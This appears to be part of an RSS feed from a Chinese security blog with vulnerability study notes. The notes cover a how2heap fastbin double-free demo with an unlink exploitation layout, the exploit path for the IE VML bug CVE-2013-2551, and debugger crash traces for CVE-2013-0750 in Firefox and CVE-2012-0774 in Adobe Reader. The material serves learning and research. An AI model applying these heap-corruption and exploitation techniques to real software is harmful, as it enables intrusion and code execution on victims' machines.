&lt;p&gt;&lt;a href=&quot;https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c&quot;&gt;一个doble free的例子&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----------------start of fastbin_dup.c-----------------
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
	printf(&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;);

	printf(&quot;Allocating 3 buffers.\n&quot;);
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	printf(&quot;1st malloc(8): %p\n&quot;, a);
	printf(&quot;2nd malloc(8): %p\n&quot;, b);
	printf(&quot;3rd malloc(8): %p\n&quot;, c);

	printf(&quot;Freeing the first one...\n&quot;);
	free(a);

	printf(&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);
	// free(a);

	printf(&quot;So, instead, we'll free %p.\n&quot;, b);
	free(b);

	printf(&quot;Now, we can free %p again, since it's not the head of the free list.\n&quot;, a);
	free(a);

	printf(&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n&quot;, a, b, a, a);
	printf(&quot;1st malloc(8): %p\n&quot;, malloc(8));
	printf(&quot;2nd malloc(8): %p\n&quot;, malloc(8));
	printf(&quot;3rd malloc(8): %p\n&quot;, malloc(8));
}
-------------------end of fastbin_dup.c-----------------

gcc -o 1 fastbin_dup.c
./1
----------------output---------------
This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0x2209420
2nd malloc(8): 0x2209440
3rd malloc(8): 0x2209460
Freeing the first one...
If we free 0x2209420 again, things will crash because 0x2209420 is at the top of the free list.
So, instead, we'll free 0x2209440.
Now, we can free 0x2209420 again, since it's not the head of the free list.
Now the free list has [ 0x2209420, 0x2209440, 0x2209420 ]. If we malloc 3 times, we'll get 0x2209420 twice!
1st malloc(8): 0x2209420    (markA)
2nd malloc(8): 0x2209440    (markB)
3rd malloc(8): 0x2209420    (markC)
-------------end of output-----------

由结果分析如下:

1.如果连续free(a),也即对应上面注释掉的变成不注释,这样会出错,因为在执行free函数时,free对应空闲堆块的link,也即对
  应空闲堆块链入空表,在第2次free动作时,检测到空表中的相邻空闲堆块是自己(同一个空闲堆块),于是系统报错
  (double free error)
2.按照上面的代码中的再次free动作[free对应link,将空闲堆块链入空表],第2次free(a)完成后空表如下:
  [freelist是头进尾出]
  freelist[2]=========a[第2次free(a),markC]=========b[markB]========a[第1次free(a),markA]
     |______________________________________________________________|
  在第2次free(a)的时候系统看了下最近的在空表上的空闲堆块不是自己,所以情况正常,不会是Double Free,所以第2次
  free(a)正常没有出错
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上面这个例子放在这里是要说明free对应link,以及野指针的用处,malloc后再free,而free之后没有置Null的指针是野指针,详情可见下面链接,这里
的代码并没有直观的看出Double Free是如何被利用在控制代码执行流程的
&lt;a href=&quot;https://zhidao.baidu.com/question/6536098.html&quot;&gt;野指针&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;下面分析wooyun文章中的Double Free浅析,这才是Double Free用以控制代码执行的一种直观的利用方法
&lt;a href=&quot;http://php.ph/wydrops/drops/Double%20Free浅析.pdf&quot;&gt;Double Free栈析&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;0x02-double-free漏洞的利用方法&quot;&gt;0x02 Double Free漏洞的利用方法&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;上面Doubl Free栈析链接中对应如下操作:

1.malloc(504)分配第1个堆块,实际分配504+8=512B大小的堆块,在下面标记为504堆块
2.p=malloc(512)分配第2个堆块,实际分配512+8=520大小的堆块,在下面标记为512堆块
    |xxxxxxxx504xxxxxxxxx|xxx(p)xxxxxx512xxxxxxxxxxx|
    第2个堆块malloc得到的指针为p,p在距离第1个堆块块首504+8+8=512+8=0x200+8偏移位置处
3.free504大小的堆块
    freelist[64]=============504堆块
4.free512大小的堆块,也即free(p),第1次free(p)
    freelist[64]=============504堆块

    freelist[65]=============512堆块
        
    此时p指针被释放,p指针成为野指针
    由于504堆块和512堆块现在都是空闲堆块,而且在内存空间中相邻,于是堆管理器将这两个堆块合并成一个新的堆块,大小为
    512+520=1032,1032&amp;gt;1024,于是这个合并的新的堆块将被链入freelist[0]所在的双向链表中
5.malloc(768),768+8=776&amp;lt;1024,776=97x8
    按理这时malloc(768)会从freelist[97]所在链表中分配出一个空闲堆块,不过可能是90%以上的情况下,这时候的
    freelist[97]所在的链表中并没有其他空闲堆块,这样就从freelist[0]中分配得到刚才合并的新堆块[1032&amp;gt;776]
    0x300=768
6.在malloc(768)得到的新内存空间中布置如下数据:

chunk chunk的指针ptr                                                        chunk尾         野指针p 
|      |                                                                     |              |
+----------------------------------------------------------------------------------------------------+
0x0    +   0x1f9   +   0x0804bfc0-0xc  +  0x0804bfc0-0x8  +  'a'x(0x200-24)  +  0x000001f8  +  0x108
|head  |fake head  |fake fd            |fake bk           |data              |fake head     |        |
+----------------------------------------------------------------------------------------------------+
       |&amp;lt;---------------------------------0x1f7-----------------------------&amp;gt;|&amp;lt;-------0x108---------&amp;gt;|

7.上面布置数据后相当于将chunk堆块伪造成空闲堆块,而野指针p所在堆块没有伪造成空闲堆块,是占用态堆块
    chunk堆块被伪造成空闲堆块后将链入freelist[64](0x200=512=64x8),伪造的关键在于如下动作:
    a)将堆块的self size和pre chunk size字段伪造为对应内存长度
    b)将决定当前堆块是否是空闲态或占用态对应的字段伪造好
    c)pre chunk size为0代表前一个堆块是占用态堆块,不是空闲堆块
    d)堆块的flag标志位有3位,最低位表示前一个堆块是否是占用态,c)和d)共同决定前一个堆块是否是空闲堆块

8.free(p),第2次free[Double Free],这时由于系统认为p前面的堆块是空闲堆块,于是两个堆块发生合并
    对应freelist[64]所在的链表中的chunk堆块要unlink下来,而一个空闲堆块的unlink对应一个DWORD SHOOT机会,也即对应
    这里的[fake fd]=fake bk,也即将0x0804bfc0-0x8写入到0x0804bfc0-0xc所在内存中
    

小结:
    Double Free的利用关键是要通过第2次的free动作制造出一个unlink的结果,这里采用的方法是通过在第2次的free动作前
    伪造即将进行第2次free动作的堆块的相邻(前一个)的堆块为空闲堆块,这样再进行第2次free动作时就会制造出两个空闲堆
    块合并而产生一个堆块的unlink,而一个unlink对应一次DWORD SHOOT,由此看出无论是怎么变化,关键是要出现unlink,而
    free对应link,这里在free(第2次p的free)后先unlink再link,所以free是有机会产生unlik的,只要这个free的堆块旁边有
    空闲的堆块

    Double Free可以利用的根源来自于野指针,可以将Double Free看作一种UAF,UAF可以利用的根源也是野指针
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 09 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/09/Double-Free%E6%BC%8F%E6%B4%9E/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/01/09/Double-Free%E6%BC%8F%E6%B4%9E/</guid>
        
        <category>漏洞战争</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2013-2551</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;漏洞源:vgx.dll在处理&amp;lt;v:stroke&amp;gt;标签的dashstyle.array.length属性时,没有对传入的参数进行完备验证而导致整数溢出
调试环境:
    win7
good knowledge:
    http://www.isclab.org.cn/archives/2014/11/2830.html
    http://www.voidcn.com/blog/tony_whu/article/p-4307461.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-分析&quot;&gt;0x01 分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;poc中关键处为:
    vml1.dashstyle=&quot;1 2 3 4 ... 44&quot;
    vml1.dashstyle.array.length=0-1
    shape.dashstyle.array.length=0-1
也即在设置dashstyle.array.length时,由原来的44变成了-1,这样导致了整数溢出漏洞,产生了数组越界访问的读写能力,而
COARuntimeStyle对象偏移0x58处为可控字符串指针,可以将可控字符串设置成AAAAAA,书中poc中为:a[i].marginLeft=&quot;a&quot;
这样就可以通过动态调试中找到内存中AAAAAA与模块基址的偏移量,从而由AAAAAA的内存地址减去该偏移量得到aslr下的模块的
基址,由此基址可通过heap spray构造rop gadgets绕过dep+aslr,然后再次利用数组越界访问的读写能力改写对象的虚表指针就
可以控制eip了

通过poc分析这个整数溢出漏洞的溢出细节可这样实现:
1)找到poc中关键的代码:vml1.dashstyle.array.length=0-1
2)通过ida中的&quot;Functions Windows&quot;中按&quot;alt+t&quot;组合键找到1)中对应的dll中的对应类的函数:
    vgx.dll中的COALineDashStyleArray类中的put_length函数
3)windbg中bu vgx!COALineDashStyleArray::put_length
4)单步调试分析汇编指令(细心活):
    分析得到导致整数溢出的关键点在
        mov esi,dword ptr [ebp+0Ch] ss:0023:040fa190=ffffffff  //获取到dashstyle数组长度值0xFFFFFFFF
        cmp eax,esi //与poc中原来设置的dashstyle数组长度0x2C做比较,大于等于则跳转
        jge vgx!COALineDashStyleArray::put_length+0xca处 //口诀:AB无符号,GL有符号,此处为g(有符号比较),导致漏洞
        的产生

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 27 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/27/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2013-2551/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/27/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2013-2551/</guid>
        
        <category>漏洞分析</category>
        
        <category>整数溢出</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2013-0750</title>
        <description>&lt;h3 id=&quot;0x00-prepare&quot;&gt;0x00 Prepare&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.firefox17.0下载链接
ftp://ftp.mozilla.org/pub/mozilla.org/firefox/releases/17.0/win32/zh-CN/Firefox%20Setup%2017.0.exe
2.firefox 17.0源码下载链接
http://releases.mozilla.org/pub/mozilla.org/firefox/releases/17.0/source/firefox-17.0.source.tar.bz2
3.firefox官方符号表服务器地址(在windbg中添加File|Symbol File Path)
SRV*c:\symbollocal\*http://symbols.mozilla.org/firefox
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-分析&quot;&gt;0x01 分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;windbg|File|Symbol File Path|在最后添加;SRV*d:\symbollocal\*http://symbols.mozilla.org/firefox
windbg|File|添加资源文件路径C:\Users\klionsec7\Desktop\mozilla-release
打开firefox17.0
f6附加firefox.exe
g
firefox打开poc.html
    (ae4.131c): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=14405418 ebx=002dbbd8 ecx=002e1000 edx=14600000 esi=002dbb80 edi=072b0031
    eip=693c2aa3 esp=002dba68 ebp=002dbaa0 iopl=0         nv up ei ng nz na pe cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
    *** WARNING: Unable to verify checksum for C:\Program Files (x86)\Mozilla Firefox\mozjs.dll
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Mozilla 
    Firefox\mozjs.dll - 
    mozjs!js::NewProxyObject+0x1043:
    693c2aa3 668939          mov     word ptr [ecx],di        ds:002b:002e1000=????     
    这里得到的中断下来的信息与书中不一致,这里得到的符号表对应的结果为mozjs!js::NewProxyObject+0x1043,书中得到的
    结果为mozjs!ReplaceRegExpCallback+0x183,对应的汇编指令都是:mov word ptr [ecx],di
    上面显示没有找到符号文件,查看当前符号路径,使用如下命令

.sympath
    0:000&amp;gt; .sympath
    Symbol search path is: srv*c:symbols*http://msdl.microsoft.com/download/symbols   
    结果中没有开始设置的firefox的符号表服务器地址,不知什么原因,调试器默认采用延迟模式加载符号,重新打开windbg,使
    用如下命令添加firefox的符号表路径

f6附加firefox.exe
.sympath+ SRV*c:\symbollocal\*http://symbols.mozilla.org/firefox
.sympath    
    Symbol search path is: srv*c:symbols*http://msdl.microsoft.com/download/symbols;
    SRV*c:\symbollocal\*http://symbols.mozilla.org/firefox
.reload
    这里如果不.reload依然会找不到符号表,可参考如下链接
    http://www.cnblogs.com/kissdodog/p/3729396.html
g
firefox打开poc.html
    (984.a00): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=0d4040d8 ebx=0045bf18 ecx=00460000 edx=0d600000 esi=0045bec0 edi=02200031
    eip=6d752aa3 esp=0045bda8 ebp=0045bde0 iopl=0         nv up ei ng nz na pe cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
    *** WARNING: Unable to verify checksum for C:\Program Files (x86)\Mozilla Firefox\mozjs.dll
    mozjs!ReplaceRegExpCallback+0x183:
    6d752aa3 668939          mov     word ptr [ecx],di        ds:002b:00460000=0000
kv
    ChildEBP RetAddr  Args to Child              
    0045bde0 6d799af8 05115710 0804d200 00000000 mozjs!ReplaceRegExpCallback+0x183 (FPO: [Non-Fpo]) 
    [e:\builds\moz2_slave\rel-m-rel-w32-bld\build\js\src\jsstr.cpp @ 2099]
    0045be10 6d79a333 00000001 0845f8e0 6d752920 mozjs!DoMatch+0xc8 (FPO: [Non-Fpo]) 
    [e:\builds\moz2_slave\rel-m-rel-w32-bld\build\js\src\jsstr.cpp @ 1694]
    0045be4c 6d7451e1 0045bec0 05410078 00000002 mozjs!str_replace_regexp+0x83 (FPO: [Non-Fpo]) 
    [e:\builds\moz2_slave\rel-m-rel-w32-bld\build\js\src\jsstr.cpp @ 2278]
    *** WARNING: Unable to verify checksum for C:\Program Files (x86)\Mozilla Firefox\firefox.exe
    0045bf6c 00310031 00310031 00310031 00310031 mozjs!js::str_replace+0x261 (FPO: [Non-Fpo]) 
    [e:\builds\moz2_slave\rel-m-rel-w32-bld\build\js\src\jsstr.cpp @ 2464]
    0045bf7c 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf80 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf84 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf88 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf8c 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf90 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf94 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf98 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bf9c 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfa0 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfa4 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfa8 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfac 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfb0 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfb4 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    0045bfb8 00310031 00310031 00310031 00310031 firefox!__dyn_tls_init_callback &amp;lt;PERF&amp;gt; (firefox+0xb0031)
    kv命令的结果中可以看到源码文件是jsstr.cpp,这里的kv的结果中的jsstr.cpp的路径并不是实际系统中的路径,可能是
    windbg的bug,在本地磁盘中全局搜索jsstr.cpp文件,找到后用windbg打开[文件|打开源文件|]这时可以看到windbg中新出
    现了一个源代码的面板,如果不手动打开,windbg不能自己找到,源代码面板中定位到如下位置:
        
    static bool
    ReplaceRegExpCallback(JSContext *cx, RegExpStatics *res, size_t count, void *p)
    {
        ReplaceData &amp;amp;rdata = *static_cast&amp;lt;ReplaceData *&amp;gt;(p);

        rdata.calledBack = true;
        size_t leftoff = rdata.leftIndex;
        size_t leftlen = res-&amp;gt;matchStart() - leftoff;
        rdata.leftIndex = res-&amp;gt;matchLimit();

        size_t replen = 0;  /* silence 'unused' warning */
        if (!FindReplaceLength(cx, res, rdata, &amp;amp;replen))
            return false;

        size_t growth = leftlen + replen;
        if (!rdata.sb.reserve(rdata.sb.length() + growth))
            return false;

        JSLinearString &amp;amp;str = rdata.str-&amp;gt;asLinear();  /* flattened for regexp */
        const jschar *left = str.chars() + leftoff;

        rdata.sb.infallibleAppend(left, leftlen); /* skipped-over portion of the search value */
        DoReplace(cx, res, rdata);定位到的位置
        return true;
    }
    windbg的源代码面板定位到上面的DoReplace语句处,但是由于缺乏相应版本的符号表,在源码调试中无法直接定位到异常指
    令对应的是DoReplace的哪一句代码.从windbg上设置的符号表服务器地址上对应的符号表一般都是最新的firefox版本的符
    号表,这里调试的firefox的版本是17.0,并不是当前最新版本,所以找不到DoReplace中具体代码位置,为了解决这个问题需
    要自动编译firefox17.0的源码.
    编译需要用到:http://ftp.mozilla.org/pub/mozilla/libraries/win32/中的mozillabuildsetup1.7,eg.将
    mozillabuildsetup1.7安装到C:\mozilla-build\,然后将firefox源码中的xulrunner\config目录复制到
    c:\mozilla-build下,在c:\mozilla-build\config\mozconfig文件中设置如下:

    ac_add_options --enable-application=browser
    ac_add_options --enable-debug
    ac_add_options --enable-tests
    ac_add_options -trace-malloc
    ac_add_options --disable-webgl
    打开mozzillabuildsetup安装目录下的start-msvc10.bat来启动vs2010后,进入mozilla源码目录,执行make -f client.mk
    build.
    系统需要安装vs2010,这里不再继续,分析至此.


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 26 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/26/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2013-0750/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/26/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2013-0750/</guid>
        
        <category>漏洞分析</category>
        
        <category>源码调试</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2012-0774</title>
        <description>&lt;h3 id=&quot;0x00-prepare&quot;&gt;0x00 Prepare&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.adobe reader 9.4.0
2.immunity debugger
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-分析&quot;&gt;0x01 分析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;打开adobe reader,od附加
f9
adobe reader中打开poc.pdf
    adobe reader崩溃,但是od无法捕获异常,换成immunity debugger可捕获异常位置

重新打开reader,immunity debugger附加
f9
reader打开poc.pdf,异常捕获,中断如下:
    6DD979C9   8D71 04          LEA ESI,DWORD PTR DS:[ECX+4]
    6DD979CC   8B1E             MOV EBX,DWORD PTR DS:[ESI]
    6DD979CE   8919             MOV DWORD PTR DS:[ECX],EBX
    6DD979D0   8BCE             MOV ECX,ESI
    6DD979D2  ^75 F4            JNZ SHORT CoolType.6DD979C8
    6DD979D4   83E8 04          SUB EAX,4
    中断位置为6dd979ce处的MOV DWORD PTR DS:[ECX],EBX,immunity debugger中下面状态栏中显示:access violation when
    wring to 6dfcf000,也即[ecx]所在内存空间不可写,因此导致崩溃，从当前堆栈窗口中找出最上面的return to的地址,右
    键在反汇编窗口跟随,得到当前的6dd979ce处的指令在如下call 调用的函数帧空间中:

    6DD96956   50               PUSH EAX
    6DD96957   FF148D D0BEFA6D  CALL DWORD PTR DS:[ECX*4+6DFABED0]       ; vulfunc
    6DD9695E   59               POP ECX
    将6dd96957处的调用标记为vulfunc,现在要在6dd96957处下断点并查看这个调用过程,但是有aslr机制,重新下断时这里不
    再会是6dd96957,需算出6dd96957与当前dll的偏移再根据偏移在重新运行reader后下断点,alt+e:
    
    Executable modules, item 22
    Base=6DD90000
    Size=0025F000 (2486272.)
    Entry=6DDD866B CoolType.&amp;lt;ModuleEntryPoint&amp;gt;
    Name=CoolType
    File version=5.05.73.1
    Path=C:\Program Files (x86)\Adobe\Reader 9.0\Reader\CoolType.dll
    在alt+e窗口中得到vulfunc在CoolType.dll中,且vulfunc在CoolType.dll中的内存偏移为:6dd96957-6dd90000=6957

重新打开reader并用immu附加,f9,alt+e,发现cooltype.dll的基址不变,仍然是6dd90000,那么前面一步的计算偏移就是多余的
了,看来泉哥在这里的想法不完全正确,这里不用算偏移,应该是操作系统没有为cooltype.dll开aslr.可直接在6dd96957处下断.
后来发现是自己错了,重新运行reader并用immu附加后cooltype.dll的地址会是6dd90000或是69360000,eg.第一次运行reader并
用immu附加后cooltype.dll的基址为6dd90000,关闭reader和immu后,第二次运行reader并用immu附加后cooltype.dll的基址为
69360000,第三次又变回6dd90000,第四次则为69360000,...以此交替.说明cooltype.dll还是开了aslr的.继续用偏移的方法下
断点,重新打开reader,immu附加,第一次cooltype.dll的基址为6dd90000,第二次为69360000,此时在69360000+6957=69366957处
下断

ctrl+g:69366957
f2
    69366955   51               PUSH ECX
    69366956   50               PUSH EAX
    69366957   FF148D D0BE5769  CALL DWORD PTR DS:[ECX*4+6957BED0]
    6936695E   59               POP ECX
    6936695F   59               POP ECX

在69366957处shift+f4下条件记录断点,记录ecx(ecx是虚拟指令索引号),设置为不中断,explanation设成:&quot;index ecx&quot;,
expression设成:&quot;ecx&quot;

f9
reader打开poc.pdf
    再次崩溃,由immu捕获崩溃,与上次崩溃信息相同,得到log面板中日志如下:

    ...
    ...
    ...
    ...
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000063
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 000000B0
    69366957   COND: index ecx = 00000061
    69366957   COND: index ecx = 00000042
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 00000078
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000063
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 000000B0
    69366957   COND: index ecx = 00000061
    69366957   COND: index ecx = 00000042
    69366957   COND: index ecx = 00000043
    69366957   COND: index ecx = 00000078
    69366957   COND: index ecx = 00000041
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000060
    69366957   COND: index ecx = 00000026
    693679CE   [18:15:48] Access violation when writing to [6959F000]
    说明是索引号为26的call调用造成了access violation,设置条件断点:当ecx为26时中断

重新打开reader并用immu附加,这次cooltype.dll基址为6dd90000,6dd90000+6957=6dd96957,ctrl+g:6dd96957
    6DD96955   51               PUSH ECX
    6DD96956   50               PUSH EAX
    6DD96957   FF148D D0BEFA6D  CALL DWORD PTR DS:[ECX*4+6DFABED0]       ; vulfunc
    6DD9695E   59               POP ECX
    6DD9695F   59               POP ECX
    6DD96960   3BC6             CMP EAX,ESI

在6dd96957上设置条件断点,shift+f2,设置断点条件为ecx==26
f9
reader打开poc.pdf
    成功中断到6dd96957处,且ecx=26,f7跟进call,汇编指令如下:

    6DD9798B   A1 E023FC6D      MOV EAX,DWORD PTR DS:[6DFC23E0]
    6DD97990   8B0D EC23FC6D    MOV ECX,DWORD PTR DS:[6DFC23EC]
    6DD97996   53               PUSH EBX
    6DD97997   56               PUSH ESI
    6DD97998   8B31             MOV ESI,DWORD PTR DS:[ECX]
    6DD9799A   8D50 FC          LEA EDX,DWORD PTR DS:[EAX-4]
    6DD9799D   3BD6             CMP EDX,ESI
    6DD9799F   57               PUSH EDI
    6DD979A0   72 45            JB SHORT CoolType.6DD979E7
    6DD979A2   8BB9 54010000    MOV EDI,DWORD PTR DS:[ECX+154]
    6DD979A8   3BD7             CMP EDX,EDI
    6DD979AA   73 3B            JNB SHORT CoolType.6DD979E7
    6DD979AC   83C0 FC          ADD EAX,-4
    6DD979AF   8B10             MOV EDX,DWORD PTR DS:[EAX]
    6DD979B1   8BDA             MOV EBX,EDX
    6DD979B3   C1E3 02          SHL EBX,2
    6DD979B6   8BC8             MOV ECX,EAX
    6DD979B8   2BCB             SUB ECX,EBX
    6DD979BA   3BCE             CMP ECX,ESI
    6DD979BC   72 29            JB SHORT CoolType.6DD979E7
    6DD979BE   3BCF             CMP ECX,EDI
    6DD979C0   73 25            JNB SHORT CoolType.6DD979E7
    6DD979C2   85D2             TEST EDX,EDX
    6DD979C4   8B39             MOV EDI,DWORD PTR DS:[ECX]
    6DD979C6   7E 0F            JLE SHORT CoolType.6DD979D7
    6DD979C8   4A               DEC EDX
    6DD979C9   8D71 04          LEA ESI,DWORD PTR DS:[ECX+4]
    6DD979CC   8B1E             MOV EBX,DWORD PTR DS:[ESI]
    6DD979CE   8919             MOV DWORD PTR DS:[ECX],EBX
    6DD979D0   8BCE             MOV ECX,ESI
    6DD979D2  ^75 F4            JNZ SHORT CoolType.6DD979C8
    6DD979D4   83E8 04          SUB EAX,4
    6DD979D7   8938             MOV DWORD PTR DS:[EAX],EDI
    6DD979D9   83C0 04          ADD EAX,4
    6DD979DC   A3 E023FC6D      MOV DWORD PTR DS:[6DFC23E0],EAX
    6DD979E1   8B4424 10        MOV EAX,DWORD PTR SS:[ESP+10]
    6DD979E5   EB 0F            JMP SHORT CoolType.6DD979F6
    6DD979E7   A1 3824FC6D      MOV EAX,DWORD PTR DS:[6DFC2438]
    6DD979EC   C705 3424FC6D 10&amp;gt;MOV DWORD PTR DS:[6DFC2434],1110
    6DD979F6   5F               POP EDI
    6DD979F7   5E               POP ESI
    6DD979F8   5B               POP EBX
    6DD979F9   C3               RETN
    此时eip=6dd9768b,单步跟踪

f8
f8
...
eip=6dd979b3
    此时汇编指令为shl ebx,2,寄存器值如下:

    EAX 6DFC622C CoolType.6DFC622C
    ECX 0577E4E4
    EDX 40000001
    EBX 40000001
    ESP 0014CA20
    EBP 0014CAB4
    ESI 6DFC6220 ASCII &quot;AA&quot;
    EDI 6DFC6344 ASCII &quot;tnfs&quot;
    EIP 6DD979B3 CoolType.6DD979B3
    这里的ebx为0x40000001,shl ebx,2之后得到ebx=0x40000001*4=0x100000004=0x00000004,导致整数溢出,再继续单步跟踪
    到6DD979CE处的MOV DWORD PTR DS:[ECX],EBX应该会出现前面一样的access violation,reader崩溃.

f8
...
eip=6dd979ce
    此时并没有崩溃,因为在6dd979c8到6dd979d2为一个循环,会在这个循环中的某一次中出现access violation使得reader崩
    溃,0x40000001是溢出的关键,它完全是由虚拟指令操作实现的.为了看清0x40000001是怎么出现的,需要知道每个虚拟指令
    索引号对应的call中的汇编指令效果,于是对溢出前的每个虚拟指令索引号对应的CALL DWORD PTR DS:[ECX*4+6DFABED0]
    设置条件记录断点,记录call前与call后虚拟栈顶vm_esp的值及虚拟指令.这里的虚拟栈顶vm_esp并不是指esp中的数据,这
    里的虚拟指令类似于java的虚拟机指令,是&quot;虚拟的&quot;,并不是真实栈中的数据,而是对虚拟指令而言的&quot;虚拟栈&quot;,如B0 01虚拟
    指令对应将1压栈的动作,这里的压栈是对虚拟指令而言的栈,并不是真实的esp中的栈,要想得到&quot;虚拟栈&quot;中的数据,需要得到
    &quot;虚拟栈&quot;对应的真实内存地址,跟踪B0 01虚拟指令的CALL DWORD PTR DS:[ECX*4+6DFABED0]的处理情况,进行如下操作

重新打开read并用immu附加,这次cooltype.dll的基址为69360000,ctrl+g:69366957,在69366957处下条件断点,设置条件为
ecx=0xB0

f9
reader打开poc.pdf
    成功中断在ecx=b0情况下,对应call的函数帧中指令如下:
            
    69368B05   A1 E0235969      MOV EAX,DWORD PTR DS:[695923E0]
    69368B0A   8B15 EC235969    MOV EDX,DWORD PTR DS:[695923EC]
    69368B10   8D48 04          LEA ECX,DWORD PTR DS:[EAX+4]
    69368B13   3B8A 54010000    CMP ECX,DWORD PTR DS:[EDX+154]
